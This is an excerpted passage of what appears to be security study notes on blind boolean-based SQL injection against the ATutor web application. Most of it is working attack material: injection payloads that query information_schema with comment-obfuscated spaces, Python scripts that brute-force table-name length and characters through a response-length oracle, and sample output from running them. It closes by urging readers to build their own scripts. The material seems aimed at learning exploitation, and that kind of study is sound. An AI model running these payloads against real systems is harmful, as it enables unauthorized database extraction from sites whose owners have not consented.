...
>     payload = f"te')/**/or/**/(length((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1)))={number}#"
>     param = {'q': payload}
>     r = requests.get(target, param)
>     content_length = int(r.headers['Content-length'])
>     if content_length > 20:
...
> - Payload:
> ```sql
> ' AND (ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) = 108 --+
> ```
> - Script:
> ```python
> import requests
...
>     for j in range(32, 256):
>         payload = f"te')/**/or/**/(select/**/ascii(substring((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),{l},1))={j})#"
>         param = {'q': payload}
>         r = requests.get(target, param)
>         content_length = int(r.headers['Content-length'])
>         if content_length > 20:
...
> ```
> Output:
> python .\atutor_tableRetrieval.py
> [*] Retreiving Database Length!
> [*] Table length:  12
> [+] Retrieving Table name!
> _
...
---
> - Modify, learn and build new scripts and commands as per your own requirements.
